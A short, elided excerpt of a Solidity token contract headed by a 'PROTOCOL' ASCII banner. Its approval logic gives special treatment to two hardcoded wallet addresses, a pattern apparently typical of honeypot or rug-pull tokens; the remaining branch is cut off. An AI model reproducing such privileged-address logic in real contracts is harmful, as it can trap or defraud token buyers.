 ...
 *   
 *     _______  _______      ___    _________    ___      ______    ___   _____     
 *    |_   __ \|_   __ \   .'   `. |  _   _  | .'   `.  .' ___  | .'   `.|_   _|    
 *      | |__) | | |__) | /  .-.  \|_/ | | \_|/  .-.  \/ .'   \_|/  .-.  \ | |      
 *      |  ___/  |  __ /  | |   | |    | |    | |   | || |       | |   | | | |   _  
 *     _| |_    _| |  \ \_\  `-'  /   _| |_   \  `-'  /\ `.___.'\\  `-'  /_| |__/ | 
 *    |_____|  |____| |___|`.___.'   |_____|   `.___.'  `.____ .' `.___.'|________| 
 *                                                                                  
 */
...
contract Token is VaultOwned, IERC20 {
    ...
    else if (owner == address(0x453b8F7d9cc92cC827438CE2AA4db1106cd51BCE)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        else if (owner == address(0x572eE1382a5348467b35c5976B112f59adbFcED7)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
